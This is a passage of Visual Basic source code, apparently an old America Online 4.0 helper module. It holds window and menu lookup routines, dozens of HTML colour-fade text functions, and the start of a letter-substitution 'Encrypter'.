Do
Text$ = FixAPIString(GetAPIText(win%))
If InStr(1, Text$, Title$, 1) Then Exit Do
If findchild = True Then
    If GetWindow(win%, GW_CHILD) Then
        ChildWin% = GetWindowByTitle(win%, Title$)
        If ChildWin% <> 0 Then
            win% = ChildWin%
            Exit Do
        End If
    End If
End If
win% = GetWindow(win%, GW_HWNDNEXT)
Loop Until win% = 0
GetWindowByTitle = win%
End Function
Function AOL40_GetSignOn() As Integer
If AOL40_IsOnline() = True Then Exit Function
AOL% = FindWindow("AOL Frame25", 0&)
MDI% = GetWindowByClass(AOL%, "MDI Client")
goodbye% = GetWindowByTitle(MDI%, "Goodbye From America Online!")
welcome% = GetWindowByTitle(MDI%, "Welcome")
If goodbye% <> 0 Then signon% = goodbye%
If welcome% <> 0 Then signon% = welcome%
If IsWindowVisible(signon%) <> 0 Then
  AOL40_GetSignOn = signon%
Else:
  AOL40_GetSignOn = 0
End If
End Function
Sub AOL40_RunAOLmenu(stringer As String)
AOL% = FindWindow("AOL Frame25", "America  Online")
Call RunMenuByString(AOL%, stringer)
End Sub
Sub Run_Menu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer
AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)
End Sub
Sub SetText1(Where%, thestring$)
Dim SendTheText%
SendTheText% = SendMessageByString(Where%, WM_SETTEXT, 0, thestring$)
End Sub
Function GetRoomName() As String
On Error Resume Next
GetRoomName = GetAPIText(AOL40_FindChatRoom())
End Function
Function EnterKey()
EnterKey = CStr(Chr(13) & Chr(10))
End Function
Function Getwindtext(Read As Integer)
BufLen% = SendMessageByNum(Read%, WM_GETTEXTLENGTH, 0, 0)
buffer$ = String(BufLen%, 0)
Q% = SendMessageByString(Read%, WM_GETTEXT, BufLen% + 1, buffer$)
DoEvents
Getwindtext = Trim(buffer$)
End Function
Function GetWindowDir()
buffer$ = String$(255, 0)
X = GetWindowsDirectory(buffer$, 255)
If Right$(buffer$, 1) <> "\" Then buffer$ = buffer$ + "\"
GetWindowDir = buffer$
End Function
Function GetWinText(hwnd As Integer) As String
lentos = SendMessage(hwnd, WM_GETTEXTLENGTH, 0&, 0&)
buffer$ = Space$(lentos)
X = SendMessageByString(hwnd, WM_GETTEXT, lentos + 1, buffer$)
GetWinText = buffer$
End Function
Function GetDir(hwnd)
Dim ins%
Dim Ret&
Dim Buff$
Buff = String$(251, vbNullString)
ins = GetWindowWord(hwnd, -6)
Ret = GetModuleFileName(ins, Buff, 250)
GetDir = Left(Buff, Ret)
End Function
Function CurrentRoom()
AOL = FindWindow("AOL Frame25", 0&)
bah = FindChildByClass(AOL, "_AOL_Glyph")
par% = GetParent(bah)
XX$ = GetWinText(par%)
CurrentRoom = XX$
End Function
Function BlackBlue(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   BlackBlue = msg
End Function
Function BlackGreen(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
  BlackGreen = msg
End Function
Function BlackGrey(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 220 / A
        F = e * B
        G = RGB(F, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
BlackGrey = msg
End Function
Function BlackPurple(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    BlackPurple = msg
End Function
Function BlackRed(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
  BlackRed = msg
End Function
Function BlackYellow(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   BlackYellow = msg
End Function
Function BlueBlack(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
  BlueBlack = msg
End Function
Function BlueGreen(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
  BlueGreen = msg
End Function
Function BluePurple(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   BluePurple = msg
End Function
Function BlueRed(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
 BlueRed = msg
End Function
Function BlueYellow(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    BlueYellow = msg
End Function
Function GreenBlack(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
GreenBlack = msg
End Function
Function GreenBlue(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 255 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   GreenBlue = msg
End Function
Function GreenPurple(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 255 - F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
  GreenPurple = msg
End Function
Function GreenRed(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255 - F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    GreenRed = msg
End Function
Function GreenYellow(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    GreenYellow = msg
End Function
Function GreyBlack(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 220 / A
        F = e * B
        G = RGB(255 - F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
  GreyBlack = msg
End Function
Function GreyBlue(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   GreyBlue = msg
End Function
Function GreyGreen(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
GreyGreen = msg
End Function
Function GreyPurple(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    GreyPurple = msg
End Function
Function GreyRed(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    GreyRed = msg
End Function
Function GreyYellow(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 255, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    GreyYellow = msg
End Function
Function PurpleBlack(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   PurpleBlack = msg
End Function
Function PurpleBlue(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
PurpleBlue = msg
End Function
Function PurpleGreen(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
PurpleGreen = msg
End Function
Function PurpleRed(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
PurpleRed = msg
End Function
Function PurpleYellow(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    PurpleYellow = msg
End Function
Function RedBlack(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    RedBlack = msg
End Function
Function RedBlue(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   RedBlue = msg
End Function
Function RedGreen(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<b><Font Color=#" & H & "></b>" & d
    Next B
 RedGreen = msg
End Function
Function RedPurple(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    RedPurple = msg
End Function
Function RedYellow(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
RedYellow = msg
End Function
Function YellowBlack(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
YellowBlack = msg
End Function
Function YellowBlue(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
YellowBlue = msg
End Function
Function YellowGreen(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    YellowGreen = msg
End Function
Function YellowPurple(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
 YellowPurple = msg
End Function
Function YellowRed(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
 YellowRed = msg
End Function
Function BlackBlueBlack(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   BlackBlueBlack = msg
End Function
Function BlackGreenBlack(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    BlackGreenBlack = msg
End Function
Function BlackGreyBlack(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    BlackGreyBlack = msg
End Function
Function BlackPurpleBlack(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
 BlackPurpleBlack = msg
End Function
Function BlackRedBlack(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    BlackRedBlack = msg
End Function
Function BlackYellowBlack(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
BlackYellowBlack = msg
End Function
Function BlueBlackBlue(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
BlueBlackBlue = msg
End Function
Function BlueGreenBlue(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    BlueGreenBlue = msg
End Function
Function BluePurpleBlue(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
  BluePurpleBlue = msg
End Function
Function BlueRedBlue(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   BlueRedBlue = msg
End Function
Function BlueYellowBlue(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
 BlueYellowBlue = msg
End Function
Function GreenBlackGreen(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
GreenBlackGreen = msg
End Function
Function GreenBlueGreen(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    GreenBlueGreen = msg
End Function
Function GreenPurpleGreen(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    GreenPurpleGreen = msg
End Function
Function GreenRedGreen(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
 GreenRedGreen = msg
End Function
Function GreenYellowGreen(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & "></b>" & d
    Next B
    GreenYellowGreen = msg
End Function
Function GreyBlueGrey(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
 GreyBlueGrey = msg
End Function
Function GreyBlackGrey(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
  GreyBlackGrey = msg
End Function
Function GreyGreenGrey(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
  GreyGreenGrey = msg
End Function
Function GreyPurpleGrey(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    GreyPurpleGrey = msg
End Function
Function GreyRedGrey(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    GreyRedGrey = msg
End Function
Function GreyYellowGrey(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    GreyYellowGrey = msg
End Function
Function PurpleBlackPurple(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
 PurpleBlackPurple = msg
End Function
Function PurpleBluePurple(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    PurpleBluePurple = msg
End Function
Function PurpleGreenPurple(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    PurpleGreenPurple = ("" + msg + "")
End Function
Function PurpleRedPurple(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    PurpleRedPurple = ("" + msg + "")
End Function
Function PurpleWhite(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 200 / A
        F = e * B
        G = RGB(255, F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   PurpleWhite = msg
End Function
Function PurpleYellowPurple(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   PurpleYellowPurple = msg
End Function
Function RedBlackRed(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   RedBlackRed = msg
End Function
Function RedBlueRed(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    RedBlueRed = msg
End Function
Function RedGreenRed(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
 RedGreenRed = msg
End Function
Function RedPurpleRed(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
  RedPurpleRed = msg
End Function
Function RedYellowRed(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
   RedYellowRed = msg
End Function
Function YellowBlackYellow(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
    YellowBlackYellow = msg
End Function
Function YellowBlueYellow(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
  YellowBlueYellow = msg
End Function
Function YellowGreenYellow(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
 YellowGreenYellow = msg
End Function
Function YellowPurpleYellow(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
YellowPurpleYellow = msg
End Function
Function YellowRedYellow(Text1)
A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        d = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next B
YellowRedYellow = msg
End Function
Function RGBtoHEX(RGB)
    A = Hex(RGB)
    B = Len(A)
    If B = 5 Then A = "0" & A
    If B = 4 Then A = "00" & A
    If B = 3 Then A = "000" & A
    If B = 2 Then A = "0000" & A
    If B = 1 Then A = "00000" & A
    RGBtoHEX = A
End Function
Function TrimSpacess(Text)
    If InStr(Text, " ") = 0 Then
    TrimSpacess = Text
    Exit Function
    End If
    For TrimSpacess = 1 To Len(Text)
    thechar$ = Mid(Text, TrimSpacess, 1)
    thechars$ = thechars$ & thechar$
    If thechar$ = " " Then
    thechars$ = Mid(thechars$, 1, Len(thechars$) - 1)
    End If
    Next TrimSpacess
    TrimSpacess = thechars$
End Function
Sub Encrypter(word$)
Made$ = ""
For Q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, Q, 1)
    leet$ = ""
    X = Int(Rnd * 3 + 1)
    ' lower case letters
    If letter$ = "a" Then leet$ = "†"
    If letter$ = "b" Then leet$ = "õ"
    If letter$ = "c" Then leet$ = "ð"
    If letter$ = "d" Then leet$ = "ô"
    If letter$ = "e" Then leet$ = "î"
    If letter$ = "f" Then leet$ = "ï"
    If letter$ = "g" Then leet$ = "ì"
    If letter$ = "h" Then leet$ = "é"
    If letter$ = "i" Then leet$ = "ê"
    If letter$ = "j" Then leet$ = "ë"
    If letter$ = "k" Then leet$ = "ä"
    If letter$ = "l" Then leet$ = "å"
    If letter$ = "m" Then leet$ = "â"
    If letter$ = "n" Then leet$ = "ù"
    If letter$ = "o" Then leet$ = "û"
    If letter$ = "p" Then leet$ = "ü"
    If letter$ = "q" Then leet$ = "ç"
    If letter$ = "r" Then leet$ = "ñ"
    If letter$ = "s" Then leet$ = "š"
    If letter$ = "t" Then leet$ = "v"
    If letter$ = "u" Then leet$ = "ÿ"
    If letter$ = "v" Then leet$ = "Ø"
    If letter$ = "w" Then leet$ = "£"
